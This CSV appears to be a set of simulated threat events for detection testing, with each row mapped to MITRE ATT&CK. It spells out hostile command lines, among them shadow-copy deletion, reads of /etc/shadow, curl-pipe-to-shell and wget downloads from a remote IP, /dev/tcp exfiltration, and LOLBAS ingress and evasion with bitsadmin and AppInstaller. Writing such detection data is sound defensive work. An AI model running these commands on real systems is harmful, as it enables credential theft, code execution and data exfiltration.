id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
PROC-TE-01,Threat Event,TRUE,WKS01,Shadow copy deletion with vssadmin.exe,C:\Windows\system32\cmd.exe,C:\Windows\system32\vssadmin.exe,vssadmin.exe,vssadmin.exe delete shadows /for=C,"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-02,Threat Event,TRUE,WKS02,Whoami being used for local groups recon,C:\Windows\system32\cmd.exe,C:\Windows\system32\whoami.exe,whoami.exe,whoami /groups,"Discovery
Execution","System Owner/User Discovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-03,Threat Event,TRUE,WKS03,Process enumeration/discovery with tasklist,C:\Windows\system32\cmd.exe,C:\Windows\system32\tasklist.exe,tasklist.exe,tasklist,"Discovery
Execution","Process Discovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-04,Threat Event,TRUE,SRV04,Apache2 webserver process spawning whoami (recon commands via webshell),/usr/sbin/apache2,/usr/bin/whoami,whoami,/usr/bin/whoami,"Persistence
Initial Access
Execution","Server Software Component: Web Shell
Exploit Public-Facing Application
Exploitation for Client Execution",,
PROC-TE-05,Threat Event,TRUE,UBUNTU05,Wget being used to download a shell script from a remote IP,/bin/bash,/usr/bin/wget,wget,wget http://193.176.183.245/a.sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-06,Threat Event,TRUE,UBUNTU06,Reading /etc/passwd with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/passwd,"Credential Access
Execution","OS Credential Dumping
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-07,Threat Event,TRUE,UBUNTU07,Reading /etc/shadow with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/shadow,"Credential Access
Execution","OS Credential Dumping
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-08,Threat Event,TRUE,UBUNTU08,Unix/Linux in-memory curl cradle (fileless execution),/usr/bin/dash,/usr/bin/curl,curl,curl http://193.176.183.245/ahdytg | sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-09,Threat Event,TRUE,WKS09,Tool Ingress via Appinstaller.exe (Lolbas Project),C:\Windows\system32\explorer.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe,AppInstaller.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLx,Command and Control,Ingress Tool Transfer,https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/,
PROC-TE-10,Threat Event,TRUE,WKS10,Exfiltration via Windows Bash.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bash.exe,bash.exe,C:\Windows\System32\bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/193.176.183.245',"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Bash/,
PROC-TE-11,Threat Event,TRUE,WKS11,Tool Ingress via Bitsadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,"Command and Control
Execution
Defense Evasion
Persistence","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-12,Threat Event,TRUE,WKS12,Bitsadmin.exe being used to execute payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"Defense Evasion
Execution
Persistence","Hide Artifacts: NTFS File Attributes
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
